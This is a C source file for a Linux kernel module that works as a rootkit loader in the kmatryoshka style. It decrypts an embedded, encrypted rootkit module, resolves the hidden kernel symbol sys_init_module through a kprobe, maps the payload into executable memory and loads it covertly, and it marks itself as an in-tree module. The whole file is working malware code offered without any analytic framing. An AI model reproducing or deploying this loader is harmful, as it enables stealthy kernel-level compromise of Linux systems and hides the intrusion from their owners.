// https://github.com/milabs/kmatryoshka
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/mman.h>

#ifdef CONFIG_KPROBES
# include <linux/kprobes.h>
#endif

#include "../encrypt/encrypt.h"

#define SYS_INIT_MODULE "sys_init_module" 

#define __DO_SYS_INIT_MODULE "__do_sys_init_module"

static char rootkit[] = {
# include "rootkit.ko.enc"
};

//#define DECRYPT_KEY 1234 // to remove

static long lookupName = 0;
module_param(lookupName, long, 0);

extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);

unsigned long ksym_lookup_name(const char *name)
{
	static typeof(ksym_lookup_name) *lookup_name = kallsyms_lookup_name;
#ifdef CONFIG_KPROBES
	if (NULL == lookup_name) {
		struct kprobe probe;
		int callback(struct kprobe *p, struct pt_regs *regs) {
			return 0;
		}
		memset(&probe, 0, sizeof(probe));
		probe.pre_handler = callback;
		probe.symbol_name = "kallsyms_lookup_name";
		if (!register_kprobe(&probe)) {
			lookup_name = (void *)probe.addr;
			unregister_kprobe(&probe);
		}
	}
#endif
	if (NULL == lookup_name)
		lookup_name = (void *)lookupName;
	return lookup_name ? lookup_name(name) : 0;
}

int init_module(void)
{
	int ret = -EINVAL;
	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;

	do_decrypt(rootkit, sizeof(rootkit), DECRYPTION_KEY);

	sys_init_module = (void *)ksym_lookup_name(SYS_INIT_MODULE);
	if (!sys_init_module) {
		sys_init_module = (void *)ksym_lookup_name(__DO_SYS_INIT_MODULE);
		if (!sys_init_module) {
			return -EINVAL;
		}
	}

	if (sys_init_module) {
		const size_t len = roundup(sizeof(rootkit), PAGE_SIZE);  // round to fit PAGE SIZE
		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0);
		if (map) {
			if(copy_to_user(map, rootkit, sizeof(rootkit)));
			if(sys_init_module(map, sizeof(rootkit), map + sizeof(rootkit))) ret = -2023;
			vm_munmap((unsigned long)map, len);
		}
	}

	return ret;
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Gr4 @ @");